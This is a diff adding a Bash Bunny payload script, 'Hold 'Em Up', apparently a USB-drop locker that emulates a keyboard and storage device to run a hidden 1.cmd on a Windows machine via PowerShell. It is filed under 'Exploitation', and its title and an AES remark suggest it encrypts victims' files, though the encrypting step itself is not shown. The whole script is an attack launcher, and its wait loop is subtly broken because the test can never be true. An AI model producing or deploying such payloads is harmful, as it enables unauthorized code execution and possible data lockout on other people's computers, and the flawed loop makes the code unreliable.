@@ -1,0 +1,31 @@
+#!/bin/bash
+#
+# Title:         Hold 'Em Up (Private Encryption Locker for BashBunny)
+# Forked from:   https://github.com/private-locker/Private-Encrypted-Locker
+# Author:        REDD (aka Ar1k88)
+# Version:       1.4
+# Target:        Windows XP SP3+
+# Props:         Microsoft for leaving AES Encryption in Windows.
+# Category:      Exploitation
+
+
+# Set up correct folders.
+GET SWITCH_POSITION
+
+KEYDIR=/root/udisk/payloads/$SWITCH_POSITION
+
+LED ATTACK
+ATTACKMODE HID STORAGE
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\1.cmd')"
+
+# Checking if script is complete.
+LED W FAST
+while [ -z "$KEYDIR/*-DONE" ] ;
+do
+	  LED W FAST
+	  sleep 3
+done
+
+rm -rf "$KEYDIR/*-DONE"
+sync
+LED FINISH
